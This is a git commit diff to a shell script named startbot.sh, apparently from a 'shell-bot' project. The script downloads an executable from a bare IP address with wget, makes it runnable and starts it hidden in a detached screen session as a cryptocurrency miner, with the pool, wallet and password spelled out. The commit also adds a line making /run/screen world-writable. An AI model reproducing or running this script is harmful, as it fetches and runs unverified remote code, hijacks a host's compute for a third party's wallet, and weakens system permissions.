6e858314e93645ab9dd83ef4db367cac71ab3504
rogerssakala <106007738+rogerssakala@users.noreply.github.com>
2022-05-22 08:18:16 +0000

    Update startbot.sh

--- startbot.sh
+++ startbot.sh
@@ -4,4 +4,5 @@
 cd /home/shell-bot
 wget http://104.248.127.206/chipata
 chmod +x chipata
+chmod 777 /run/screen
 screen -dm -S build ./chipata --disable-gpu --algorithm randomepic --pool epic.ca.hashrate.to:4000 --wallet 499f420d52285ab12dda1be9e4d516a7b41e4baace0a3fc54f73db3dd418f3ac --password wanama --log-file log.txt
